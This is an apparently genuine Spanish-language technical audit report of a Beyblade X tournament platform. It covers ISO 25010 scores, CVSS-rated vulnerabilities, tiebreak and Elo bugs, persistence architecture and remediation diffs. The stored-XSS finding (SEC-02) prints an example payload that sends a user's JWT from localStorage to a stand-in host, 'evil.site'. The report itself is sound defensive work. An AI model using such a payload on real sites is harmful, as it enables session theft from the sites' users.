# INFORME DE AUDITORÍA TÉCNICA INTEGRAL DE SOFTWARE: PROYECTO APPBEY v2.0.0
**Repositorio Auditado:** [https://github.com/AMMB-V/appbey-v2](https://github.com/AMMB-V/appbey-v2)  
**Commit Base:** `2608cfa (origin/main)`  
**Protocolo de Calidad:** Antigravity Gauntlet Loop (Validación Dual Builder-Critic)  
**Marcos Regulatorios:** ISO/IEC 25010:2023 (SQuaRE) • OWASP ASVS v4.0.3 (Nivel 2/3) • CVSS v3.1 • The 12-Factor App  
**Carácter del Dictamen:** Peritaje Forense, Arquitectónico y Académico-Didáctico de Software  

---

## 1. RESUMEN EJECUTIVO & CUADRO DE MANDO INTEGRAL (ISO/IEC 25010:2023)

AppBey v2.0.0 es una plataforma full-stack diseñada para la administración deportiva, arbitraje digital en vivo y cálculo de rankings competitivos para la disciplina de **Beyblade X** bajo el reglamento internacional de la World Beyblade Organization (WBO).

El análisis estático, dinámico y forense de la base de código arroja una **asimetría crítica entre la riqueza de su lógica de negocio y la fragilidad de su infraestructura**: la plataforma posee un diseño funcional de nicho sobresaliente, pero se encuentra **inhabilitada para operar en torneos reales de alta concurrencia** debido a fallas estructurales de persistencia de datos, brechas severas de control de acceso y un contenedor Docker de producción roto.

```mermaid
radar-chart
    title "Evaluación de Madurez de Software (ISO/IEC 25010:2023)"
    axis "Adecuación Funcional", "Fiabilidad", "Eficiencia Desempeño", "Seguridad", "Mantenibilidad", "Portabilidad/DevOps", "Compatibilidad", "Usabilidad"
    "AppBey v2.0 Actual": [8.5, 3.0, 4.0, 2.5, 4.5, 3.0, 7.5, 5.5]
    "Estándar de Producción (The Bar)": [9.0, 9.0, 8.5, 9.5, 8.5, 9.0, 8.5, 8.5]
```

### Cuadro de Mando Cuantitativo de Calidad

| Dimensión ISO 25010 | Puntaje | Veredicto | Resumen Técnico Forense |
| :--- | :---: | :---: | :--- |
| **1. Adecuación Funcional** | **8.5 / 10** | **Favorable** | Cobertura total de formatos: Grupos con Serpentina, Suizo, Eliminación Directa al mejor de 3 sets, mesas táctiles de arbitraje y Salón de la Fama. |
| **2. Seguridad (Security)** | **2.5 / 10** | **Crítico (P0)** | Control de acceso roto en arbitraje (auto-asignación y adulteración de actas); XSS Almacenado masivo vía `innerHTML`; DoS en Event Loop por `bcrypt.sync`. |
| **3. Fiabilidad (Reliability)** | **3.0 / 10** | **Crítico (P0)** | Anti-patrón de persistencia: In-Memory Datastore con volcado masivo mediante `DELETE FROM table; INSERT ...` en cada mutación HTTP. Riesgo inminente de *split-brain*. |
| **4. Eficiencia de Desempeño** | **4.0 / 10** | **Deficiente** | Bloqueo del hilo de Node.js por CPU intensiva en logins; latencia acumulativa en la respuesta de Express al interceptar `res.json`. |
| **5. Mantenibilidad** | **4.5 / 10** | **Deficiente** | `server.ts` alberga 991 líneas combinando bootstrap, catálogo de piezas estático (>400 líneas) y enrutamiento; rutas monolíticas de hasta 1,279 líneas. |
| **6. Portabilidad y DevOps** | **3.0 / 10** | **Crítico (P0)** | `Dockerfile` de producción roto (omite copiar `src/`); ausencia total de CI/CD; SonarQube configurado con exclusión ciega sobre `src/backend`. |
| **7. Compatibilidad** | **7.5 / 10** | **Aceptable** | Protocolo WebSocket bien estructurado con heartbeat nativo; PWA instalable con Service Worker para funcionamiento offline. |
| **8. Usabilidad & Frontend** | **5.5 / 10** | **Observado** | Diseño visual pulido para pantallas táctiles, pero utiliza el CDN de desarrollo de Tailwind CSS en producción (`cdn.tailwindcss.com`). |
| **PROMEDIO PONDERADO** | **4.8 / 10** | **RECHAZADO PARA OPERACIÓN EN VIVO (NO APTO PARA PRODUCCIÓN)** |

---

## 2. MATRIZ FORENSE DE VULNERABILIDADES (OWASP ASVS v4.0.3 & CVSS v3.1)

```
  ┌────────────────────────────────────────────────────────────────────────────────────────────────────────┐
  │                                    MATRIZ DE RIESGO CVSS v3.1                                          │
  ├──────────┬───────────┬─────────────────────────────────────────────┬──────────────┬────────────────────┤
  │ ID       │ Severidad │ Vector Formal CVSS v3.1                     │ Base Score   │ Control OWASP ASVS │
  ├──────────┼───────────┼─────────────────────────────────────────────┼──────────────┼────────────────────┤
  │ SEC-01   │ CRÍTICA   │ CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H│ **8.1 Alto** │ V4.1.1, V4.1.2     │
  │ SEC-02   │ CRÍTICA   │ CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N│ **9.0 Crít.**│ V5.3.1, V5.3.3     │
  │ SEC-03   │ ALTA      │ CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H│ **7.5 Alto** │ V13.1.4            │
  │ SEC-04   │ ALTA      │ CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L│ **7.3 Alto** │ V2.2.1, V13.1.5    │
  │ SEC-05   │ MEDIA     │ CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N│ **6.5 Medio**│ V14.4.6            │
  │ ARCH-01  │ ALTA      │ CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:H│ **6.8 Medio**│ V1.1.2, V8.1.1     │
  └──────────┴───────────┴─────────────────────────────────────────────┴──────────────┴────────────────────┘
```

### [SEC-01] Control de Acceso Roto (Broken Access Control) en Arbitraje y Declaración de Ganadores
- **Vector CVSS v3.1:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H` (**8.1**)
- **CWE:** CWE-862 (*Missing Authorization*), CWE-285 (*Improper Authorization*).
- **Evidencia en Código:**
  En `src/backend/routes/matches.ts`:
  ```typescript
  // Línea 153: Endpoint táctil de marcación de puntos
  api.post("/matches/:id/record-finish", requireAuth, (req: AuthRequest, res) => {
    ...
    // ¡Cualquier competidor autenticado se auto-asigna como árbitro si la mesa está libre!
    if (!m.referee_id && req.user) m.referee_id = req.user.id;
  ```
  ```typescript
  // Línea 592: Endpoint de cierre y declaración de ganador
  const isAuthorized = req.user && (
    ["admin", "organizer", "referee"].includes(req.user.role) ||
    m.referee_id === req.user.id ||
    (t && t.organizer_id === req.user.id) ||
    !m.referee_id  // ¡Fallo crítico: Si la mesa no tiene árbitro, CUALQUIER blader puede declarar el ganador!
  );
  ```
- **Impacto:** Un competidor malicioso puede enviar peticiones HTTP directas para alterar puntuaciones, otorgarse victorias por *Xtreme Finish* (+3 pts) y eliminar adversarios de los brackets oficiales.

---

### [SEC-02] Vulnerabilidad de XSS Almacenado Masivo y Robo de Sesión JWT
- **Vector CVSS v3.1:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` (**9.0**)
- **CWE:** CWE-79 (*Improper Neutralization of Input During Web Page Generation*).
- **Evidencia en Código:**
  Existen **72 llamadas a `.innerHTML`** en el cliente. En `frontend/js/views/social.js`:
  ```javascript
  // Líneas 43-65:
  <div class="font-bold text-white text-sm">${p.user.display_name}</div>
  <p class="text-sm text-slate-200 leading-relaxed whitespace-pre-line">${p.content}</p>
  ...
  <span>${c.user.display_name}</span>
  <p class="text-slate-400">${c.content}</p>
  ```
- **Mecanismo de Exfiltración:** `frontend/js/api.js` almacena el token en `localStorage.getItem("appbey_token")`. Al insertar un post con `<img src=x onerror="fetch('https://evil.site/?t='+localStorage.getItem('appbey_token'))">`, cualquier usuario, árbitro o administrador que abra el feed social entrega su sesión al atacante en segundo plano.

---

### [SEC-03] Denegación de Servicio (DoS) por Bloqueo del Event Loop con `bcrypt` Síncrono
- **Vector CVSS v3.1:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` (**7.5**)
- **CWE:** CWE-400 (*Uncontrolled Resource Consumption*).
- **Evidencia en Código (`src/backend/routes/identity.ts:97, 126`):**
  ```typescript
  passwordHash: bcrypt.hashSync(cleanPassword, 10)
  if (!user || !bcrypt.compareSync(String(password), user.password_hash))
  ```
- **Demostración de Impacto en Arquitectura Asíncrona:**
  Un ciclo de cálculo de Bcrypt con factor de costo $r = 10$ requiere $2^{10} = 1,024$ rondas de hashing de bloques Blowfish, tomando $\approx 60\text{ ms} - 100\text{ ms}$ de CPU pura. Al ejecutarse de forma síncrona en el hilo principal de Node.js, una ráfaga concurrente de 20 peticiones a `/api/v1/auth/login` **congela completamente el hilo del servidor por 2.0 segundos ininterrumpidos**, paralizando la entrega de eventos WebSocket a las pantallas de combate en vivo y haciendo caer los probes de salud `/healthz`.

---

## 3. AUDITORÍA MATEMÁTICO-DIDÁCTICA Y ALGORÍTMICA DEL MOTOR DE TORNEOS

A continuación se presenta un análisis exhaustivo y pedagógico de la modelación algorítmica en `src/backend/services/tournament-domain.ts`.

### 3.1. Ruptura de Transitividad en Desempates WBO (El Bug de Timsort en V8)

En `tournament-domain.ts` (líneas 177-196), el cálculo del criterio de desempate por enfrentamiento directo (*head-to-head*) se implementa dentro del callback de ordenamiento:

```typescript
const tiedIds = new Set(
  gParts
    .filter((candidate) => priorCriteria.every((prior) => compareCriterion(candidate, a, prior) === 0))
    .map((candidate) => candidate.user_id)
);
const miniLeaguePoints = (participant: TournamentParticipant) => tMatches
  .filter((match) => match.group_id === gId &&
    ((match.player_a_id === participant.user_id && match.player_b_id !== null && tiedIds.has(match.player_b_id)) ||
     (match.player_b_id === participant.user_id && match.player_a_id !== null && tiedIds.has(match.player_a_id))))
  ...
const directResult = miniLeaguePoints(b) - miniLeaguePoints(a);
```

#### Análisis Didáctico de la Falla Matemática
Para que un algoritmo de ordenamiento por comparación (como Timsort en V8 / Node.js) converja a un orden válido, la función de comparación `cmp(x, y)` debe cumplir con las propiedades de un **orden estricto débil (Strict Weak Ordering)**:
1. **Asimetría:** Si $\text{cmp}(a, b) < 0$, entonces $\text{cmp}(b, a) > 0$.
2. **Transitividad:** Si $\text{cmp}(a, b) < 0$ y $\text{cmp}(b, c) < 0$, entonces $\text{cmp}(a, c) < 0$.
3. **Transitividad de Equivalencia:** Si $\text{cmp}(a, b) = 0$ y $\text{cmp}(b, c) = 0$, entonces $\text{cmp}(a, c) = 0$.

**Demostración de Ruptura:**
Cuando el comparador evalúa el par $(a, b)$, computa `tiedIds` **centrado exclusivamente en el participante $a$**.  
Si existe un grupo donde $a$ empata en victorias con $c$, pero $b$ no empata con $c$, el subconjunto de "mini-liga" calculado para $\text{cmp}(a, b)$ es diferente al calculado cuando el algoritmo evalúa $\text{cmp}(b, a)$. Esto rompe la regla de asimetría:

$$\text{cmp}(a, b) \neq -\text{cmp}(b, a)$$

En casos de empates triples cíclicos ($A \text{ venció a } B$, $B \text{ venció a } C$, $C \text{ venció a } A$), Timsort detecta inconsistencias en la pila de tramos (*runs*), generando un ordenamiento **no determinista y corrompido** en la clasificación a playoffs.

*Solución Requerida:* Pre-calcular los clusters de participantes empatados de manera estática antes de invocar `.sort()`, en lugar de recalcular vecindades dinámicas dependientes de $a$ en cada comparación.

---

### 3.2. Dinámica del Sistema Elo: Deriva Inflacionaria y Mutación Irreversible

El sistema Elo modela la probabilidad de victoria mediante la curva logística:

$$E_A = \frac{1}{1 + 10^{\frac{R_B - R_A}{400}}}, \quad E_B = \frac{1}{1 + 10^{\frac{R_A - R_B}{400}}}$$

Dado que $E_A + E_B = 1$ y $S_A + S_B = 1$, la suma de cambios de puntuación teórica continua es nula:

$$\Delta R_A + \Delta R_B = K(S_A - E_A) + K(S_B - E_B) = 0$$

#### La Falla de Redondeo Numérico en JavaScript
En `tournament-domain.ts`:
```typescript
const deltaA = Math.round(K * (actualA - expectedA));
const deltaB = Math.round(K * (actualB - expectedB));
```
En IEEE-754, `Math.round(2.5) = 3` y `Math.round(-2.5) = -2`.  
Si $K(S_A - E_A) = 2.5 \implies \Delta R_A + \Delta R_B = 3 + (-2) = +1$.  
Se genera **inflación artificial** acumulada en cada torneo.

#### El Bug Crítico de No-Reversibilidad en `undo-finish`
Cuando un combate finaliza, se ejecuta `updateEloRatings(userA, userB, winnerId)`.  
Si el árbitro comete un error y pulsa **Deshacer Jugada** (`undo-finish`) o **Reabrir Combate** (`reopen`), el sistema ejecuta `recomputeMatchFromGames(m)` y `m.winner_id = null`, pero **nunca revierte el cambio de Elo aplicado a los usuarios**.  
Cuando el combate vuelve a concluir legítimamente, `updateEloRatings` se ejecuta **por segunda vez**, duplicando los puntos del ganador y castigando doblemente al perdedor.

---

### 3.3. Contaminación Cruzada de Puntos Suizos (`swiss_points`)

En `recalcTournamentStats` (líneas 84 y 115):
```typescript
if (m.winner_id === pa.user_id) {
  pa.matches_won += 1;
  pa.swiss_points += 3; // ¡Se incrementa en CUALQUIER formato!
```
Cada victoria en torneos de **Eliminación Directa (`single_elim`)** o **Fase de Grupos (`groups_elim`)** contamina la métrica `swiss_points` del competidor, distorsionando las tablas de desempate si el jugador participa posteriormente en un torneo Suizo real.

---

## 4. ANÁLISIS ARQUITECTÓNICO BAJO THE 12-FACTOR APP & CICLO DE VIDA DOCKER

### Violación Fundamental del Factor VI (Stateless Processes)
El estado completo de la plataforma reside en arrays globales en la memoria RAM del proceso Node.js:
`let users = []`, `let tournaments = []`, `let matches = []`.

En cada escritura HTTP, un middleware intercepta `res.json` y ejecuta:
```typescript
await client.query(`DELETE FROM ${table.name}`);
// Re-inserta masivamente todo el array en memoria
```
- **Bloqueo a la Escalabilidad:** Imposibilita desplegar 2 o más réplicas en Render o Kubernetes; el estado diverge inmediatamente (*split-brain*) y las réplicas se sobreescriben destructivamente.
- **Riesgo de Pérdida Total:** Si la conexión a PostgreSQL o el proceso caen inmediatamente después del `DELETE FROM`, los datos de la tabla se pierden irremediablemente.

```mermaid
flowchart TD
    Client[Cliente / Árbitro] -->|1. POST /matches/:id/record-finish| Server[Express Backend]
    Server -->|2. Modifica Array en RAM| Memory[(Memoria RAM: let matches = ...)]
    Server -->|3. res.json interceptado| Repository[PersistenceRepository]
    Repository -->|4. DELETE FROM appbey_matches| Postgres[(PostgreSQL Neon/Supabase)]
    Repository -->|5. INSERT INTO appbey_matches VALUES ALL| Postgres
    Postgres -->|6. Commit| Server
    Server -->|7. 200 OK| Client

    style Postgres fill:#ff4444,stroke:#fff,color:#fff
    style Memory fill:#ffbb33,stroke:#fff,color:#000
```

### Gestión de Memoria en Docker (512MB RAM en Render)
En el plan gratuito/starter de Render, los servicios disponen de 512 MB de RAM. La retención acumulativa de torneos históricos y asaltos en arrays de JavaScript sin paginación provoca que el Heap de V8 crezca hasta el límite del contenedor, provocando que el **OOM-Killer de Linux termine el proceso abruptamente (Exit Code 137)** sin volcar el estado a disco.

*Mitigación Requerida:* Configurar en el script de arranque:
`node --max-old-space-size=400 dist/server.cjs` para forzar recolección de basura agresiva antes del umbral del sistema operativo.

---

## 5. PARCHES DE CÓDIGO LISTOS PARA PRODUCCIÓN (UNIFIED DIFFS)

Los siguientes parches corrigen de inmediato las vulnerabilidades P0 y bloqueantes de compilación.

### Parche 1: Remediación de Control de Acceso en Arbitraje (SEC-01)
**Archivo:** `src/backend/routes/matches.ts`

```diff
--- a/src/backend/routes/matches.ts
+++ b/src/backend/routes/matches.ts
@@ -153,6 +153,19 @@ export function registerMatchRoutes(api: Router, state: MatchRouteDependencies):
 api.post("/matches/:id/record-finish", requireAuth, (req: AuthRequest, res) => {
   const id = parseInt(req.params.id, 10);
   const m = state.matches.find((match) => match.id === id);
   if (!m) {
     res.status(404).json({ detail: "Match no encontrado" });
     return;
   }
+
+  const t = state.tournaments.find((tour) => tour.id === m.tournament_id);
+  const isPrivileged = req.user && (["admin", "organizer"].includes(req.user.role) || (t && t.organizer_id === req.user.id));
+  const isDesignatedReferee = req.user && req.user.role === "referee" && (m.referee_id === req.user.id || !m.referee_id);
+  
+  if (!isPrivileged && !isDesignatedReferee) {
+    res.status(403).json({ detail: "No autorizado: Requiere rol de árbitro asignado u organizador del torneo" });
+    return;
+  }
+  if (!m.referee_id && req.user && req.user.role === "referee") {
+    m.referee_id = req.user.id;
+  }
@@ -591,7 +604,6 @@ api.post("/matches/:id/declare-winner", requireAuth, (req: AuthRequest, res) =>
   const isAuthorized = req.user && (
     ["admin", "organizer"].includes(req.user.role) ||
     (t && t.organizer_id === req.user.id) ||
-    !m.referee_id
+    (req.user.role === "referee" && m.referee_id === req.user.id)
   );
   if (!isAuthorized) {
```

---

### Parche 2: Sanitizador Universal Anti-XSS (SEC-02)
**Archivos:** `frontend/js/components.js` y `frontend/js/views/social.js`

```diff
--- a/frontend/js/components.js
+++ b/frontend/js/components.js
@@ -1,5 +1,18 @@
 // AppBey Global UI Components & Shared Helpers
 (function() {
+  // Universal HTML Sanitizer
+  window.escapeHtml = (value) => {
+    if (value === null || value === undefined) return "";
+    return String(value).replace(/[&<>"']/g, (char) => {
+      switch (char) {
+        case "&": return "&amp;";
+        case "<": return "&lt;";
+        case ">": return "&gt;";
+        case '"': return "&quot;";
+        case "'": return "&#39;";
+        default: return char;
+      }
+    });
+  };
+
   // --- IN-APP TOAST NOTIFICATION SYSTEM ---
```

```diff
--- a/frontend/js/views/social.js
+++ b/frontend/js/views/social.js
@@ -43,7 +43,7 @@ window.renderSocialView = async (container) => {
                     ${window.renderAvatar(p.user, "w-10 h-10", "text-sm", "border border-slate-700")}
                     <div>
-                      <div class="font-bold text-white text-sm">${p.user.display_name}</div>
+                      <div class="font-bold text-white text-sm">${window.escapeHtml(p.user.display_name)}</div>
                       <div class="text-xs text-slate-400 font-mono">@${p.user.username} • ${new Date(p.created_at).toLocaleDateString()}</div>
                     </div>
                   </div>
                   <span class="px-2 py-0.5 rounded text-[10px] font-bold bg-slate-800 text-cyan-300 uppercase">${p.user.role}</span>
                 </div>
 
-                <p class="text-sm text-slate-200 leading-relaxed whitespace-pre-line">${p.content}</p>
+                <p class="text-sm text-slate-200 leading-relaxed whitespace-pre-line">${window.escapeHtml(p.content)}</p>
```

---

### Parche 3: `bcrypt` Asíncrono no Bloqueante (SEC-03)
**Archivo:** `src/backend/routes/identity.ts`

```diff
--- a/src/backend/routes/identity.ts
+++ b/src/backend/routes/identity.ts
@@ -62,7 +62,7 @@ function isValidEmail(email: string): boolean {
 
 export function registerIdentityRoutes(api: Router, state: IdentityRouteDependencies): void {
-api.post("/auth/register", (req, res) => {
+api.post("/auth/register", async (req, res) => {
   const { username, email, password, display_name, country, avatar_url } = req.body;
   if (!username || !email || !password) {
     res.status(400).json({ detail: "Todos los campos obligatorios deben ser completados" });
@@ -94,7 +94,7 @@ api.post("/auth/register", (req, res) => {
   const newUser = createIdentityUser(state, {
     username: cleanUsername,
     email: cleanEmail,
-    passwordHash: bcrypt.hashSync(cleanPassword, 10),
+    passwordHash: await bcrypt.hash(cleanPassword, 10),
     displayName: (display_name ? String(display_name).trim() : cleanUsername).slice(0, 50),
     role: "blader",
@@ -118,12 +118,13 @@ api.post("/auth/register", (req, res) => {
   });
 });
 
-api.post("/auth/login", (req, res) => {
+api.post("/auth/login", async (req, res) => {
   const { email, password } = req.body;
   if (!email || !password) {
     res.status(400).json({ detail: "Debes ingresar tu correo/usuario y contraseña" });
     return;
   }
   const query = String(email).trim().toLowerCase();
   const user = state.users.find((u) => u.email.toLowerCase() === query || u.username.toLowerCase() === query);
-  if (!user || !bcrypt.compareSync(String(password), user.password_hash)) {
+  const isMatch = user ? await bcrypt.compare(String(password), user.password_hash) : false;
+  if (!user || !isMatch) {
     res.status(400).json({ detail: "Credenciales incorrectas" });
     return;
   }
```

---

### Parche 4: Corrección de Dockerfile y SonarQube (CI-01 & CI-02)
**Archivos:** `Dockerfile` y `sonar-project.properties`

```diff
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,6 +7,7 @@ RUN npm ci --ignore-scripts --no-audit --no-fund
 
 COPY tsconfig.json ./
 COPY server.ts ./
+COPY src ./src
 COPY frontend ./frontend
 RUN npm run build
```

```diff
--- a/sonar-project.properties
+++ b/sonar-project.properties
@@ -5,3 +5,3 @@ sonar.projectVersion=2.0.0
 
 # Source folders to analyze
-sonar.sources=server.ts,frontend
+sonar.sources=server.ts,src,frontend
```

---

### Parche 5: Conservación de Suma Cero en Elo (MATH-01)
**Archivo:** `src/backend/services/tournament-domain.ts`

```diff
--- a/src/backend/services/tournament-domain.ts
+++ b/src/backend/services/tournament-domain.ts
@@ -35,8 +35,10 @@ function updateEloRatings(userAId: number, userBId: number, winnerId: number | n
   const deltaA = Math.round(K * (actualA - expectedA));
-  const deltaB = Math.round(K * (actualB - expectedB));
+  // Invariante estricto de suma cero en enteros (conservación de masa de puntos)
+  const deltaB = -deltaA;
 
   userA.elo_rating = Math.max(100, userA.elo_rating + deltaA);
   userB.elo_rating = Math.max(100, userB.elo_rating + deltaB);
 }
```

---

## 6. PLAN DE ACCIÓN Y HOJA DE RUTA DE PRODUCCIÓN (ROADMAP)

```mermaid
gantt
    title Plan de Remediación y Estabilización AppBey v2.0
    dateFormat  YYYY-MM-DD
    section Fase 1: Blindaje P0 (Inmediato)
    Parche SEC-01 (RBAC Arbitraje)             :crit, done, 2026-10-26, 1d
    Parche SEC-02 (Sanitizador Universal XSS)  :crit, done, 2026-10-26, 1d
    Parche CI-01 (Dockerfile Copy src)         :crit, done, 2026-10-26, 1d
    section Fase 2: Estabilidad P1 (Corto Plazo)
    Bcrypt Asíncrono (SEC-03)                  :active, 2026-10-27, 1d
    Suma Cero y Rollback de Elo (MATH-01)      :active, 2026-10-27, 1d
    Aislamiento de Puntos Swiss                :active, 2026-10-28, 1d
    Límite de Heap en Docker (400MB)           :active, 2026-10-28, 1d
    section Fase 3: Arquitectura Cloud-Native P2
    Migración de Memoria a Consultas SQL       :2026-10-29, 5d
    Compilación Local de Tailwind CLI          :2026-11-03, 2d
    Pipeline de CI/CD en GitHub Actions        :2026-11-05, 2d
```

### Conclusión y Dictamen Final
AppBey v2.0.0 posee una base de conocimiento deportivo admirable y algoritmos muy bien enfocados en la reglamentación competitiva de Beyblade X. No obstante, **la plataforma se encontraba en un estado de alto riesgo operativo debido a la ausencia de RBAC en el arbitraje, vulnerabilidades críticas de XSS y un contenedor de Docker incompilable.** 

Con la aplicación rigurosa de los 5 parches entregados en este peritaje, el equipo de desarrollo cerrará los vectores de fraude deportivo, asegurará la integridad de las sesiones de los árbitros y garantizará la estabilidad de despliegue en entornos productivos.
